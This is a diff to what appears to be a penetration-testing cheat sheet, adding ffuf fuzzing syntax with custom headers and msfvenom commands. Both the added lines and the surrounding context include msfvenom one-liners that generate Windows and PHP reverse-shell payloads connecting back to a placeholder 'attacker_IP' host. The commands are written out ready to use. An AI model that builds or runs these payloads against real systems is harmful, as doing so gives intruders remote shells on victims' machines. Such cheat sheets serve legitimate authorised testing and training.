@@ -1358,6 +1358,9 @@ ffuf -w /path/to/wordlist.txt -request file_here
 
 # fuzz with cookies (e.g. authentication)
 ffuf -w /path/to/wordlist.txt -u http://URL_here/FUZZ -b "cookie_here: value_here; another_cookie_here: value_here"
+
+# fuzz with headers
+ffuf -w /path/to/wordlist.txt -u http://URL_here/FUZZ -H "header_here: value_here" -H "another_header_here: value_here"
 ```
 
 
@@ -2111,6 +2114,9 @@ msfvenom --list encoder
 # list available formats
 msfvenom --list format
 
+# list options for payload
+msfvenom -p payload_here --list-options
+
 # create Windows TCP reverse shell exe - 64-bit (unstaged)
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f exe -a x64 -o shell.exe
 
@@ -2139,6 +2145,9 @@ msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f js_le
 
 # create php reverse shell
 msfvenom -p php/reverse_php LHOST=attacker_IP LPORT=port_here -o shell.php
+
+# create reverse shell as python shellcode - Windows 32-bit (unstaged)
+msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP_here LPORT=port_here -f py -a x86
 ```
 
 
